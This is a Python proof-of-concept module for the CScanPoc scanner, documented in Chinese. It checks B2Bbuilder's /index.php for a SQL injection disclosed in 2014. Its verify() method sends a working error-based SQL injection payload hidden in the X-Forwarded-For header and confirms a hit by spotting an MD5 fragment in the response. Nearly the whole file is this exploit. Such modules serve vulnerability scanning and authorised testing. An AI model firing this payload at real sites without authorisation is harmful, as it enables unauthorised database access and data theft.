# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'B2Bbuilder_0001'  # 平台漏洞编号，留空
    name = 'B2Bbuilder SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-28'  # 漏洞公布时间
    desc = '''
        B2Bbuilder /index.php 存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=069790'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'B2Bbuilder'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7dc84a90-2ee7-4dfd-9056-ce4f89d75728'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-069790
            s = requests.session()
            verify_url = self.target + "/index.php"
            r = s.get(verify_url)
            header = {
                "X-Forwarded-For": "1.1.1.1',(select 1 from (select count(*),concat((Select concat(md5(3.14))),floor(rand(0)*2))x from information_schema.tables group by x)a),1,1)#"
            }
            r = s.get(verify_url, headers=header)
            if r.status_code == 200 and '4beed3b9c4a886067de0e3a094246f781' in r.text:
                #security_hole(url + "\r\npayload:headers" + headers)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;漏洞地址为{url};\n具体请查看漏洞详情'.format(
                    target=self.target, name=self.vuln.name,url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
